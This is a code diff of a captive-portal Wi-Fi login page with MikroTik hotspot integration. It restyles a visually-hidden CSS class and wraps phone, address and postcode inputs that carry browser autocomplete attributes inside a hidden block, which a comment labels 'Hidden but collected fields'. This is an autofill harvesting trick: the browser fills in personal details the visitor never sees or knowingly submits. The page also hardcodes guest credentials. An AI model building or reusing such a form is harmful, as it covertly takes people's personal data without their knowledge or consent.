@@ -107,14 +107,15 @@
     
     /* Hidden Fields */
     .visually-hidden {
-      border: 0;
-      clip: rect(0 0 0 0);
-      height: 1px;
-      margin: -1px;
-      overflow: hidden;
-      padding: 0;
       position: absolute;
       width: 1px;
+      height: 1px;
+      padding: 0;
+      margin: -1px;
+      overflow: hidden;
+      clip: rect(0, 0, 0, 0);
+      white-space: nowrap;
+      border: 0;
     }
     
     /* Button Styles */
@@ -190,14 +191,16 @@
         >
       </div>
       
-      <!-- Hidden Form Fields -->
-      <input type="tel" name="phone" autocomplete="tel" class="visually-hidden">
-      <input type="text" name="address" autocomplete="address-line1" class="visually-hidden">
-      <input type="text" name="postcode" autocomplete="postal-code" class="visually-hidden">
-      
-      <!-- MikroTik Hotspot Integration -->
-      <input type="hidden" name="username" value="guest">
-      <input type="hidden" name="password" value="guest">
+      <!-- Hidden but collected fields -->
+      <div class="visually-hidden">
+        <input type="tel" id="phone" name="phone" autocomplete="tel">
+        <input type="text" id="address" name="address" autocomplete="address-line1">
+        <input type="text" id="postcode" name="postcode" autocomplete="postal-code">
+        
+        <!-- MikroTik Hotspot Integration -->
+        <input type="text" name="username" value="guest">
+        <input type="text" name="password" value="guest">
+      </div>
       
       <!-- Submit Button -->
       <button type="submit">Connect to Wi-Fi</button>
